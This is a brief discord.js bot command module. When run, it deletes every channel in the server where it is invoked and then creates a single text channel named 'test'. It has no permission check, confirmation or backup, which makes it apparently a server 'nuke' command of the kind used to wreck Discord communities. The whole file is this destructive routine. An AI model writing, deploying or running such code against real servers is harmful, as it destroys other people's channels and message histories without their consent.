'use strict';

const Discord = require('discord.js');

exports.run = (arguments) => {
    let guild = new Discord.GuildChannelManager(arguments.messageObject.guild);
    arguments.messageObject.guild.channels.cache.forEach(channel => channel.delete())
    guild.create("test", {
        type: "text"
    });
}